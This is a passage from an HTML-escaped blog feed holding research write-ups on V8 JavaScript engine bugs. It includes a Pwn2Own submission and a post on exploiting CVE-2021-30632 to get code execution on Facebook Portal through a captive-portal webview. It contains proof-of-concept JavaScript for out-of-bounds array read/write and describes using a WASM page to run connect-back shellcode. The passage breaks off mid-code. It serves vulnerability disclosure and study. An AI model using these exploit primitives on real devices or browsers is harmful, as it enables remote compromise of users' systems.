+&lt;h2 id=&quot;vulnerability-exploitation&quot;&gt;Vulnerability Exploitation&lt;/h2&gt;
+
+&lt;p&gt;The bug leads to mismatch type of &lt;strong&gt;i&lt;/strong&gt; in optimization engine and actual value of &lt;strong&gt;i&lt;/strong&gt;. Actual value of &lt;strong&gt;i&lt;/strong&gt; is &lt;strong&gt;NaN&lt;/strong&gt;, while optimization engine decides value of &lt;strong&gt;i&lt;/strong&gt; is of type &lt;strong&gt;kInteger&lt;/strong&gt;. We use this value as a &lt;strong&gt;length&lt;/strong&gt; to construct a JS array. This mismatch of &lt;strong&gt;length&lt;/strong&gt; value makes the &lt;strong&gt;length&lt;/strong&gt; field is larger than the capacity of its backing store, leading an out-of-bound read/write to this array.&lt;/p&gt;
+
+&lt;p&gt;Below is a Proof-of-concept that creates OOB read/write JS array&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;                                       &lt;span class=&quot;c1&quot;&gt;// i: kInteger &amp;gt; \[-Infinity, Infinity\]&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// \[1024, Infinity\]&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                    &lt;span class=&quot;c1&quot;&gt;// \[-Infinity, -1024\]&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1025&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// \[-1025, -1024\]&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                    &lt;span class=&quot;c1&quot;&gt;// \[1024, 1025\]&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1022&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                     &lt;span class=&quot;c1&quot;&gt;// \[2, 3\]&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                       &lt;span class=&quot;c1&quot;&gt;// 0&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                       &lt;span class=&quot;c1&quot;&gt;// 10&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;In optimization engine, the &lt;strong&gt;value&lt;/strong&gt; of value is predicted to be 10. But the actual value is very large number because of mismatch type of &lt;strong&gt;i&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Additionally, JS array operator is optimized also. It uses actual value of &lt;strong&gt;value&lt;/strong&gt; as a length but the backing store is create with the predicted value that much more smaller than length. So we can get OOB read/write to this new JS array. Use this array we can get an arbitrary read/write primitive. Final we use RWX page of WASM to run our connect-back shell-code.&lt;/p&gt;
+
+&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;
+
+&lt;p&gt;10/29/2021: Exploit submitted to Pwn2Own Competition&lt;/p&gt;
+
+&lt;p&gt;11/01/2021: Submission got rejected due to the usage of n-day&lt;/p&gt;</content><author><name>Chi Tran</name></author><category term="research" /><summary type="html">Overview</summary></entry><entry><title type="html">Pwning the Facebook Portal</title><link href="http://localhost:4000/research/2022/01/21/pwning-facebook-portal.html" rel="alternate" type="text/html" title="Pwning the Facebook Portal" /><published>2022-01-21T00:00:00-06:00</published><updated>2022-01-21T00:00:00-06:00</updated><id>http://localhost:4000/research/2022/01/21/pwning-facebook-portal</id><content type="html" xml:base="http://localhost:4000/research/2022/01/21/pwning-facebook-portal.html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+
+&lt;p&gt;Back in November, 2021, my friend and I were trying to make an attempt to participate Pwn2Own. Unfortunately, due to some rules of exploitation. Our submission was not accepted. Today, as the vulnerability has now been fixed by the vendor, we decide to publish this blog post regarding a vulnerability that was found on &lt;a href=&quot;https://portal.facebook.com/&quot;&gt;Facebook Portal&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;vulnerability-summary&quot;&gt;Vulnerability Summary&lt;/h2&gt;
+
+&lt;p&gt;The attack was conducted relying on the usage of vulnerable browser version (Chrome/92.0.4515.131). This Chromium-based webview is related to the Out-of-bounds write in V8 (CVE-2021-30632) leading a Remote Code Execution on Facebook Portal @ latest version @1.29.1&lt;/p&gt;
+
+&lt;p&gt;Generally, whenever a device try to connect to a Wireless router that has Captive Portal Auth Mechanism, the wireless router, as part of Auth Mechanism, will send the request to a login form. Users would have to have a valid set of credential to be granted access to the Internet. This HTML login form is parsed and run by an obsolete chromium-based webview (Chrome/92.0.4515.131).&lt;/p&gt;
+
+&lt;p&gt;By exploiting this behavior via the above attack surface, we leveraged a 1-Day exploitation on Out-of-bounds in V8 (CVE-2021-30632) to get code execution on sandboxed webview process.&lt;/p&gt;
+
+&lt;h2 id=&quot;vulnerability-detail&quot;&gt;Vulnerability Detail&lt;/h2&gt;
+
+&lt;p&gt;Optimized code that stores global properties does not get de-optimized when the property map gets changed, leading to type confusion vulnerability. Prior to the patch, when Turbofan compiles code for storing global properties that has the &lt;strong&gt;kConstantType&lt;/strong&gt; attribute (i.e. the storage type has not changed), it inserts &lt;strong&gt;DependOnGlobalProperty&lt;/strong&gt; (1. below) and &lt;strong&gt;CheckMaps&lt;/strong&gt; (2. below) to ensure that the property store does not change the map of the property cell:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;     &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PropertyCellType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kConstantType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;dependencies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DependOnGlobalProperty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;property&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_cell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;//&amp;lt;---- 1. ... if (property\_cell\_value.IsHeapObject()) { MapRef property\_cell\_value\_map = property\_cell\_value.AsHeapObject().map(); if (property\_cell\_value\_map.is\_stable()) { dependencies()-&amp;gt;DependOnStableMap(property\_cell\_value\_map);&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&amp;lt;----- fall through } // Check that the {value} is a HeapObject. value = effect = graph()-&amp;gt;NewNode(simplified()-&amp;gt;CheckHeapObject(),&lt;/span&gt;
+                                            &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;effect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;control&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+          &lt;span class=&quot;c1&quot;&gt;// Check {value} map against the {property\_cell\_value} map.&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;effect&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;graph&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NewNode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;                          &lt;span class=&quot;c1&quot;&gt;//&amp;lt;----- 2. simplified()-&amp;gt;CheckMaps(&lt;/span&gt;
+                  &lt;span class=&quot;n&quot;&gt;CheckMapsFlag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kNone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                  &lt;span class=&quot;n&quot;&gt;ZoneHandleSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;property&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_cell&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_value&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())),&lt;/span&gt;
+              &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;effect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;control&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;However, when the map of the global property (&lt;strong&gt;property_cell_value_map&lt;/strong&gt;) is changed in place after the code is compiled, the optimized code generated by the above only de-optimizes when &lt;strong&gt;property_cell_value_map&lt;/strong&gt; is stable. So for example, if a function store is optimized when the map of the global property &lt;strong&gt;x&lt;/strong&gt; is unstable:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;store&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Then an in-place change to the map of x will not de-optimize the compiled &lt;strong&gt;store&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newProp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&amp;lt;------ x now has new map, but the optimized store still assumed it had an old map&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This causes the map for &lt;strong&gt;x&lt;/strong&gt; in the optimized &lt;strong&gt;store&lt;/strong&gt; function to be inaccurate. Another function &lt;strong&gt;load&lt;/strong&gt; can now be compiled to access &lt;strong&gt;newProp&lt;/strong&gt; from &lt;strong&gt;x&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newProp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The optimized &lt;strong&gt;load&lt;/strong&gt; will assume &lt;strong&gt;x&lt;/strong&gt; to have a new map with &lt;strong&gt;newProp&lt;/strong&gt; as a property. If the optimized &lt;strong&gt;store&lt;/strong&gt; is now used to store an object with the old map back to &lt;strong&gt;x&lt;/strong&gt;, the next time &lt;strong&gt;load&lt;/strong&gt; is called, a type confusion will occur because load still assumes &lt;strong&gt;x&lt;/strong&gt; has the new map.&lt;/p&gt;
+
+&lt;h2 id=&quot;vulnerability-exploitation&quot;&gt;Vulnerability Exploitation&lt;/h2&gt;
+
+&lt;p&gt;Using this bug, we can create a &lt;strong&gt;type confusion&lt;/strong&gt; between 2 kinds of Javascript array. Because Javascript arrays have differently sized backing stores for different element kinds, a confusion between an &lt;strong&gt;SMI&lt;/strong&gt; array (element size &lt;strong&gt;4&lt;/strong&gt;) and a &lt;strong&gt;double&lt;/strong&gt; array (element size &lt;strong&gt;8&lt;/strong&gt;) will lead to out-of-bounds read and write in a Javascript array.&lt;/p&gt;
+
+&lt;p&gt;Below is the Proof of Concept (PoC) that triggers OOB read and write:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;oobRead&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;oobWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;//All have same map, SMI elements, MapA&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arr0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arr1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;//Optimize foo&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19321&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19319&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arr1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;//optimize oobRead&lt;/span&gt;
